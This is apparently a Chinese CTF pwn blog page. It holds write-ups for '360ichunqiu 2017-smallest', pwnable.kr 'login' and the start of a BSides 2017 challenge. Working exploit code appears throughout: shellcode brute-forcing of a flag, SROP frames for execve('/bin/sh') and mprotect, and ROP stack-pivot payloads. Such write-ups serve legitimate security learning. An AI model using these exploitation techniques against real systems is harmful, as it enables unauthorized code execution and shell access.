eax</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_to64 = <span class="string">&#x27;&#x27;&#x27; </span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x4040405b</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,rcx</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov rdx,0x70</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_open = asm(shellcode_open)</span><br><span class="line">shellcode_to64 = asm(shellcode_to64,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode_read_flag = asm(shellcode_read_flag,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">p, flag_pos, ch</span>):</span></span><br><span class="line">        payload = <span class="string">&quot;Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103e4A070c7o4D0c1P0n0x0R3X8P0t140p2C4A2N1P005p0q1M0c3c2u194Y7o0q0y154008135L1L0p3T400q2p0p0p1M0A3r3S0A0B053O0s2G0r051k2z1l2y0w2O0p093k0y&quot;</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov dl, byte ptr [rsi+&#123;&#125;]</span></span><br><span class="line"><span class="string">        mov cl, &#123;&#125;</span></span><br><span class="line"><span class="string">        cmp cl,dl</span></span><br><span class="line"><span class="string">        jz loop</span></span><br><span class="line"><span class="string">        mov al,231</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        loop:</span></span><br><span class="line"><span class="string">        jmp loop</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(flag_pos,ch),arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag_pos == <span class="number">0</span>:</span><br><span class="line">            shellcode = <span class="string">&quot;cmp byte ptr[rsp+&#123;&#125;], &#123;&#125;; jz $-4; ret&quot;</span>.<span class="built_in">format</span>(flag_pos, ch)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            shellcode = <span class="string">&quot;cmp byte ptr[rsp+&#123;&#125;], &#123;&#125;; jz $-5; ret&quot;</span>.<span class="built_in">format</span>(flag_pos, ch)</span><br><span class="line">        check = asm(shellcode, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        payload = shellcode_open + shellcode_to64 + shellcode_read_flag + check </span><br><span class="line">        <span class="comment">#pause()</span></span><br><span class="line">        p.send(payload)</span><br><span class="line">        <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">my_flag = <span class="string">&quot;&quot;</span></span><br><span class="line">flag_pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="comment">#p = remote(&quot;39.105.137.118&quot;, 50050)</span></span><br><span class="line">        p = process(<span class="string">&quot;./shellcode&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(ch)</span><br><span class="line">            pwn(p, flag_pos, ch)</span><br><span class="line">            p.recvline(timeout=<span class="number">3.0</span>)</span><br><span class="line">            my_flag = my_flag + <span class="built_in">chr</span>(ch)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&gt;&quot;</span>, my_flag)</span><br><span class="line">            flag_pos += <span class="number">1</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            ch += <span class="number">1</span></span><br><span class="line">            p.close()</span><br><span class="line">    <span class="keyword">if</span>(my_flag[-<span class="number">1</span>] == <span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">log.info(<span class="string">&quot;flag:%s&quot;</span>%my_flag)</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/360ichunqiu%202017-smallest/">360ichunqiu 2017-smallest</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，开了一个NX，没办法shellcode。IDA打开查看程序，找漏洞，有个屁的漏洞，只有一个syscall的系统调用，各种栈操作也没有。</p>
<p>2.观察这个系统调用，系统调用参数通过edx,rsi,rdi赋值，edx直接被赋值为400h，buf对应的rsi被rsp赋值，系统调用号fd对应的rdi被rax赋值。再查看汇编代码，有xor rax,rax，所以rax一定是0，那么这个syscall系统调用的就是read函数，读取的数取直接存入栈顶。由于buf大小为400h，且只有一个syscall，之后直接retn，没有leave指令，这就代表了rsp指向的地址就是我们执行完syscall后start函数retn的返回地址(pop eip)。也就是如果输入一个地址，读取完之后，通过retn就会跳转到该地址中。另外程序中除了retn之外没有其它对栈帧进行操作的指令，如果输入多个syscall地址，就可以反复执行syscall。并且最开始输入400h字节，程序流完全可控。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527242.jpeg" alt="img"></p>
<p>3.首先想到rop，但是题目没给Libc，并且通过调试发现，这个程序压根就没导入外部的Libc库，IDA中打开没有extern，完全没办法常规rop，那么想用SROP。远程调试一下查看堆栈数据，发现临时创建的smallest段数据没有可写权限，能够利用的只有[stack]栈数据。所以这里需要先泄露一个栈地址来让我们能够往栈中写入数据binsh从而调用execve(‘/bin/sh\x00’，0，0)来直接getshell。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527471.jpeg" alt="img"></p>
<p>4.之后观察栈上的数据，发现当运行到syscall时，rsp下方的内容全是栈上的地址。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527913.jpeg" alt="img"></p>
<p>rbp一直都是0x000……这是因为程序只有一个start函数，根本就没有为函数再次创建栈，所用的只是最初生成的栈空间。根据这个原理，我们可以通过系统调用sys_write函数，来打印rsp指向的内容，也就是某个栈地址，这样就成功泄露栈地址。</p>
<p>5.但是sys_write的调用号是1，而通过调试发现rax的初始值被默认设置为0，并且程序中没有任何修改rax的代码。唯一一个也只有xor   rax, rax，但是任何数和本身异或的结果都是0，所以如果程序每次都从这行代码执行，那么执行的系统调用号永远都是0，也就是会无限循环read。这里想到由于栈完全可控，并且输入一个地址，程序执行完这个地址对应的函数后retn会直接跳转到rsp的下一行。这里选择让程序再执行一次sys_read函数，之后我们为其中一次输入一个字节，并且这次返回不再从xor这行代码开始执行，从mov rsi, rsp开始。由于sys_read的返回值自动写回给rax(一般函数的返回值都会写给rax)，所以读取几个字节read就向rax写入多少，这样就会使得rax也可以得到控制，不再被xor为0，调用我们想调用的系统函数。</p>
<p>6.所以编写payload:先尝试一下看能否泄露栈地址，test1.py</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload += p64(set_rsi_rdi_addr)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">#泄露栈地址之后返回到start，执行下一步操作。</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload[8:8+1])</span><br></pre></td></tr></table></div></figure>

<p>#利用sys_read随便读取一个字符，设置rax = 1，由于retn关系，rsp下拉了一个单位，所以这里会读入到原先的rsp+0x8处，也就是从原先的Payload中第8个字符开始，抽取一个字符，就是set_rsi_rdi_addr的最后一个字节，为了不改变返回地址。如果写成：io.send(‘\xb8’)效果一样，都是为了不改变返回地址。之后再执行set_rsi_rdi_addr从而执行write函数，</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">stack_addr = u64(io.recv()[8:16]) + 0x100</span><br><span class="line">#从最初的rsp+0x10开始打印400字节数据，那么从泄露的数据中抽取栈地址，+0x100防止栈数据过近覆盖</span><br><span class="line">log.info(&#x27;stack addr = %#x&#x27; %(stack_addr))</span><br></pre></td></tr></table></div></figure>

<p>7.这里可以看到成功泄露了一个栈地址，但是不能再用简单读入binsh字符串之后设置SigreturnFrame结构体来getshell，因为这里设置读入地址是通过rsp设置的。如果将rsp设置为我们想读入binsh的栈地址，那么肯定是可以读入binsh字符串的，但是当程序运行到retn时，跳转的是binsh这个地址，这是不合法的，没办法跳转，程序会崩溃。</p>
<p>这里就考虑使用SigreturnFrame()来进行栈劫持，将整个栈挪移到目的地。</p>
<p>(1)首先布置SigreturnFrame()的栈空间，进行栈劫持：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_read = SigreturnFrame() </span><br><span class="line">#设置read的SROP帧，不使用原先的read是因为可以使用SROP同时修改rsp，实现stack pivot</span><br><span class="line">frame_read.rax = constants.SYS_read#调用read读取payload2</span><br><span class="line">frame_read.rdi = 0#fd参数</span><br><span class="line">frame_read.rsi = stack_addr#读取payload2到rsi处</span><br><span class="line">frame_read.rdx = 0x300#读取长度为0x300</span><br><span class="line">#读取的大小</span><br><span class="line">frame_read.rsp = stack_addr#设置SROP执行完的rsp位置</span><br><span class="line">#设置执行SROP之后的rsp为stack_addr，里面存的是start_addr，retn指令执行后从start开始。</span><br><span class="line">frame_read.rip = syscall_addr#设置SROP中的一段代码指令</span><br></pre></td></tr></table></div></figure>

<p>(2)发送payload。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload1 = &quot;&quot;</span><br><span class="line">payload1 += p64(start_addr)#读取payload[8:8+15]，设置rax=0xf0</span><br><span class="line">payload1 += p64(syscall_addr)#利用rax=0xf0,调用SROP</span><br><span class="line">payload1 += str(frame_read)</span><br><span class="line">io.send(payload1)</span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload1[8:8+15])</span><br><span class="line">#为rax赋值为0xf0</span><br><span class="line">sleep(3)</span><br></pre></td></tr></table></div></figure>

<p>程序运行SROP过程中，会执行read函数，将payload2读取到stack_addr处，所以当程序运行完SROP后，栈顶rsp被劫持到stack_addr处，同时stack_addr上保存的内容是payload2，首地址是start，所以retn执行后仍旧从start开始。</p>
<p>(3)设置第二次的SigreturnFrame攻击：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_execve = SigreturnFrame()</span><br><span class="line">#设置execve的SROP帧，注意计算/bin/sh\x00所在地址</span><br><span class="line">frame_execve.rax = constants.SYS_execve</span><br><span class="line">frame_execve.rdi = stack_addr+0x108</span><br><span class="line">frame_execve.rip = syscall_addr</span><br></pre></td></tr></table></div></figure>

<p>这里的0x108是计算出来的，需要计算从stack_addr到rdi，也就是binsh字符串的距离。由于传进去的是结构体，大小为0xf8。前一个例子中binsh字符串是放在str(frameExecve)之前，所以没有那么大。这里却是放在str(frame_execve)之后，所以从stack_addr为起始，start_addr，syscall_addr，frame_execve)，总共为0xf8+0x08*2=0x108，这里不太懂可以调试一下看看。也就是再一次start_addr读取字符串binsh的位置。</p>
<p>8.发送payload，读取binsh字符串，getshell：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload2 = &quot;&quot;</span><br><span class="line">payload2 += p64(start_addr)#处在stack_addr处，读取payload[8:8+15]，设置rax=0xf0</span><br><span class="line">payload2 += p64(syscall_addr)#处在stack_addr+0x08,利用rax=0xf0,调用SROP</span><br><span class="line">payload2 += str(frame_execve)#处在stack_addr+0x10</span><br><span class="line">payload2 += &quot;/bin/sh\x00&quot;#处在stack+0x108处</span><br><span class="line">io.send(payload2)</span><br><span class="line">sleep(3)</span><br><span class="line">io.send(payload2[8:8+15])</span><br><span class="line">sleep(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>

<p>9.尝试使用mprotect为栈内存添加可执行权限x，从而shellcode来getshell。</p>
<p>(1)第一段的劫持栈和读取payload2进入劫持栈处都是一样的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_read = SigreturnFrame()#设置read的SROP帧</span><br><span class="line">frame_read.rax = constants.SYS_read</span><br><span class="line">frame_read.rdi = 0</span><br><span class="line">frame_read.rsi = stack_addr</span><br><span class="line">frame_read.rdx = 0x300</span><br><span class="line">frame_read.rsp = stack_addr</span><br><span class="line">#读取payload2，这个stack_addr地址中的内容就是start地址，SROP执行完后ret跳转到start</span><br><span class="line">frame_read.rip = syscall_addr</span><br></pre></td></tr></table></div></figure>

<p>(2)第二段需要调用mprotect来修改权限：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">frame_mprotect = SigreturnFrame()</span><br><span class="line">#设置mprotect的SROP帧，用mprotect修改栈内存为RWX</span><br><span class="line">frame_mprotect.rax = constants.SYS_mprotect</span><br><span class="line">frame_mprotect.rdi = stack_addr &amp; 0xFFFFFFFFFFFFF000</span><br><span class="line">frame_mprotect.rsi = 0x1000</span><br><span class="line">frame_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC</span><br><span class="line">#权限为R,W,X</span><br><span class="line">frame_mprotect.rsp = stack_addr</span><br><span class="line">#劫持栈地址rsp</span><br><span class="line">frame_mprotect.rip = syscall_addr</span><br></pre></td></tr></table></div></figure>

<p>(3)最后的shellcode:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload2 = &quot;&quot;</span><br><span class="line">payload2 += p64(stack_addr+0x10) #处在stack_addr</span><br><span class="line">#SROP执行完后，ret到stack_addr+0x10处的代码，即执行shellcode</span><br><span class="line">payload2 += asm(shellcraft.amd64.linux.sh())#处在stack_addr+0x10</span><br><span class="line">io.send(payload2)</span><br><span class="line">sleep(3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>

<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/Alictf%202016-vss/">pwnable.kr-login</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec,开了NX保护，IDA打开找漏洞，发现程序特别奇怪，没有main函数，这里应该是把elf文件的符号信息给清除了。正常情况下编译出来的文件里面带有符号信息和调试信息，这些信息在调试的时候非常有用，但是当文件发布时，这些符号信息用处不大，并且会增大文件大小，这时可以清除掉可执行文件的符号信息和调试信息，文件尺寸可以大大减小。可以使用strip命令实现清除符号信息的目的。</p>
<p>2.虽然这里找不到main函数，但是start函数是一定会存在的，由于start按F5反汇编不成功，所以这里进入到start函数的汇编代码中：</p>
<p>由于start中的结构基本固定，最后基本上都是如下，所以这里sub_4011B1其实就是main函数，这里就可以点进去看了。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">mov     rdi, offset main</span><br><span class="line">call    _libc_start_main</span><br></pre></td></tr></table></div></figure>

<p>2.这里的main函数可以反汇编成功，那么就开始分析漏洞。第一个函数是sub_4374E0，进去之后如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">signed __int64 result; // rax</span><br><span class="line">result = 37LL;</span><br><span class="line">__asm &#123; syscall; LINUX - sys_alarm &#125;</span><br></pre></td></tr></table></div></figure>

<p>使用系统调用号37，也就是0x25，代表alarm。</p>
<p>3.sub_408800字符串单参数，且参数都被打印到屏幕上，可以猜测是puts。sub_437EA0调用sub_437EBD，并且fd参数位为0号，且接收三个参数，看下汇编代码：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">mov       eax, 0</span><br><span class="line">syscall;  LINUX - sys_read</span><br></pre></td></tr></table></div></figure>

<p>调用0号syscall，推测为read函数。(系统调用号有)</p>
<p>4.进入sub_40108E函数中分析，这个函数处理了我们的输入，可以说就是关键函数了。看半天啥也没看懂，直接上调试。先输入十几个A看看，发现经过sub_400330函数之后，内存中输入的A，也就是a1处的内容被复制到了v2，这里先猜测是个类似strncpy函数的东西。然后看内容，既然局部变量v2只有0x40,而这个复制函数的的参数有80,也就是0x50，多了0x10。那么再调试看看，输入0x48个字节A，发现sub_40108E函数的ebp被我们改掉了：</p>
<p>sub_400330((__int64)&amp;v2, a1, 80LL);</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549889.jpeg" alt="img"></p>
<p>但是程序接着运行下去却不太行，陷入了循环，然后一直运行后崩溃，连之后的read(v8, (__int64)&amp;v3, 40LL);这段read代码都没有运行。</p>
<p>5.再观察下程序，有个代码有意思：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">sub_400330((__int64)&amp;v2, a1, 0x50LL);</span><br><span class="line">if ( (_BYTE)v2 == &#x27;p&#x27; &amp;&amp; BYTE1(v2) == &#x27;y&#x27; )</span><br><span class="line">    return 1LL;</span><br></pre></td></tr></table></div></figure>

<p>在复制完字符串之后进入一个判断语句，如果开头是py，就直接retn，不经过下面代码，所以我们完全可以在这就直接返回。但是这里有个问题，这个return有没有汇编指令里的leave操作呢，如果没有，那rsp仍然在最前面，不会跳转到返回地址的地方，看汇编代码，可以看到最后是通过判断后跳转到了locret_40011AF，而这段地址里就是leave和retn的汇编操作，能够将rsp拉到返回地址处，那直接return就完事了。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550236.jpeg" alt="img"></p>
<p>6.那么这里就可以判断出来我们的输入会被复制到v2这个局部变量中，并且最多0x50，也就是说除开rbp，我们可以再控制一个该函数的返回地址。那么开始尝试呗。由于只有一个返回地址，没有后门程序，最先想到的肯定是onegadget，但是不知道libc版本，没办法onegadget。那只有一个返回地址可以做什么，那么只有栈劫持了。其它WP大多都是抬高rsp，我想可不可以降低rsp，通过一次payload来getshell，也就是通过ROPgadget搜索sub rsp，但是搜出来的都不太行，要么太大，超过0x50，要么就很奇怪。然后一般栈劫持需要一个ret来接着控制程序流，这里也没搜到。同时由于使用的复制函数经过调试就是strncpy，字符串里不能有\x00，否则会被当做字符串截断从而无法复制满0x50字节制造可控溢出，这就意味着任何地址(因为地址基本都会在最开始带上00)都不能被写在前0x48个字节中，彻底断了sub rsp的念想。所以还是抬高栈吧。但是抬高栈也有点问题，就是我们输入的被复制的只有0x50个字节，抬高有啥用，不可控啊。然后就想到之前的read函数，读了400个字节，而紧接着就是调用该函数。刚好局部变量v2第一个被压栈，与sub_40108E函数栈的栈底紧紧挨在一起，也就是说越过sub_40108E函数栈的栈底和返回地址就可以直接来到main函数栈。而main函数栈中又只有一个我们输入的局部变量v4，所以sub_40108E函数栈的返回地址之后的第一个地址就是我们输入的局部变量v4的地址。(这里通过调试也可以发现)</p>
<p>7.那么经过计算，其实只要有一个pop,ret操作，让rsp抬高一下就可以到达我们输入的首地址。但是由于经过前面分析，我们需要在程序开头输入py来使得该函数直接return，那么如果只是一个pop,ret操作，那么程序第一个执行的代码就是我们输入的开头，包含了py的开头，这就完全不可控了，开头如果是py那怎么计算才能是一个有效地址呢。</p>
<p>8.那么就只能查找add rsp，只要满足add rsp 0x50之上就可以完全操控了。这里至少需要0x50也是因为这是strncpy，不能将地址写到前0x48个字节，否则会截断，而最后返回地址的覆盖可以被完全复制是这里本来就是一个返回地址，保存的内容应该是00401216，也就是之前call sub_40108E的下一段地址。这里在复制的时候肯定被截断了，但是由于本来就是找到一个可用的地址，截断了覆盖的也只是将401216换成了add rsp 0x58;ret这个地址(如果我们的add rsp的有效地址地方包含了00，那指定会出错)。那么payload的语句应该是payload = “py” + “a”*(0x48-0x02) + add_rsp_addr + padding + 实际控制代码。</p>
<p>9.利用ROPgadget搜索add esp的相关内容，可以查到一个地址0x46f205，操作是add rsp, 0x58; ret，这样就可以顺利将栈抬升到0x58的地方，所以payload的组成应该是：payload = “py” + “a”<em>0x46 + p64(0x46f205) + “a”</em>8 + p64(addr2)+…(a*8是用来填充的，因为抬升到了0x58处，复制之后0x50处是一段空白地方，所以还需要填充一下使p64(addr2)能顺利被抬升至0x58处被执行)。后面的p64(addr2)和…就是我们的常规gadget操作了。</p>
<p>10.现在需要system函数和/bin/sh字符串了。没有Libc，system函数和/bin/sh也没有，所以这里需要输入/bin/sh字符串，然后system函数需要通过syscall来实现。(64位程序下是syscall函数，32位程序下就是Int 0x80)</p>
<p>11.这里先完成binsh的输入：payload = p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(pop_rax)+ p64(rax_value) + p64(syscall)因为是64位程序，函数从左往右读取参数所取寄存器依次为：rdi，rsi，rdx, rcx, r8, r9, 栈传递，但是实际情况中是从右往左读取参数，也就是当只有三个参数时，读取顺序应该是rdx,rsi,rdi对应的为read(rdi,rsi,rdx)。</p>
<p>这里rdx是输入的大小，rsi是输入的内存地址buf(随便找一段可读可写的就行了)，rdi是fd标志位，由于是通过syscall调用，所以除了配置三个read函数参数还需要配置系统调用号，也就是rax的传参为0x0。<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549806.jpeg" alt="img">这里如果不使用syscall，其实也可以用我们之前猜出来的read函数的plt表，只是这样就可以不用设置rax了。</p>
<p>▲这里不能使用401202处的call read，因为call会压入下一行代码的作为read返回地址，那样就不可控了。这里选择系统调用是因为没有read在got表中的真实地址，不然其实调用got表地址也可以。</p>
<p>12.接着调用system函数，同样采用syscall系统调用，需要几个参数的设置rax=59,rdx=0,rsi=0,（这是调用syscall必须的前置条件，因为是linux规定的，可以上网查一下就知道）。都可以通过Pop gadget来实现，之后传参rdi为&amp;buf，最后调用即可getshell。(59为系统调用号)所以紧接着的payload = p64(pop_rax) + p64(rax_value) + p64(pop_rdx) + p64(rdx_value) + p64(pop_rsi) + p64(rsi_value) + p64(pop_rdi) + p64(rdi_value) + p64(syscall)<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191549760.jpeg" alt="img">这里就必须的设置rax为0x3b了。</p>
<p>▲sh不能用来传给syscall开shell，但是int 0x80可以。syscall-64，int 0x80-32。</p>
<p>▲syscall是在上进入内核模式的默认方法x86-64。该指令在Intel处理器的 32位操作模式下不可用。sysenter是最常用于以32位操作模式调用系统调用的指令。它类似于syscall，但是使用起来有点困难，但这是内核的关注点。int 0x80 是调用系统调用的传统方式，应避免使用，是32位程序下的。</p>
<p>系统调用查询网址：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://syscalls.w3challs.com/" >https://syscalls.w3challs.com/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/BSides%20San%20Francisco%20CTF%202017-b_64_b_tuff/">BSides San Francisco CTF 2017-b_64_b_tuff</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec下，只开了NX，之后IDA打开文件之后，有如下语句：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">s = (char *)base64_encode((int)buf, v7, v5);</span><br><span class="line">((void (*)(void))v5)();</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555015.jpeg" alt="img"></p>
<p>这里v7是输入的Buf，v5是mmap分配的内存空间。之后的语句：代表了将v5对应的内存空间强制转化为函数指针并且调用，在汇编代码中也可以看出来：这里的[ebp+var_18]就是我们输入的buf经过编码base64编码后存放的地方。</p>
